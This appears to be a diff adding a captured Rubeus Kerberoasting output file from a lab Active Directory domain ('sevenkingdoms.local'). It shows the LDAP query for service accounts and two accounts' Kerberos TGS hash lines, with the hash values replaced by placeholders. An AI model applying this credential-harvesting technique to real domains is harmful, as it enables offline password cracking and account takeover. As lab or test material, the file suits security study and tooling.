@@ -1,0 +1,33 @@
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  <VERSION>
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : sevenkingdoms.local
+[*] Searching path 'LDAP://kingslanding.sevenkingdoms.local/DC=sevenkingdoms,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 2
+
+[*] SamAccountName         : jaime.lannister
+[*] DistinguishedName      : CN=jaime.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
+[*] ServicePrincipalName   : MSSQLSvc/sql01.sevenkingdoms.local:1433
+[*] PwdLastSet             : <TIMESTAMP>
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*jaime.lannister$sevenkingdoms.local$MSSQLSvc/sql01.sevenkingdoms.local:1433@sevenkingdoms.local*$<KEY32>$<KIRBI>
+
+[*] SamAccountName         : wf-svc-mssql
+[*] DistinguishedName      : CN=wf-svc-mssql,CN=Users,DC=sevenkingdoms,DC=local
+[*] ServicePrincipalName   : MSSQLSvc/wf-svc-mssql.sevenkingdoms.local:1433
+[*] PwdLastSet             : <TIMESTAMP>
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*wf-svc-mssql$sevenkingdoms.local$MSSQLSvc/wf-svc-mssql.sevenkingdoms.local:1433@sevenkingdoms.local*$<KEY32>$<KIRBI>
+
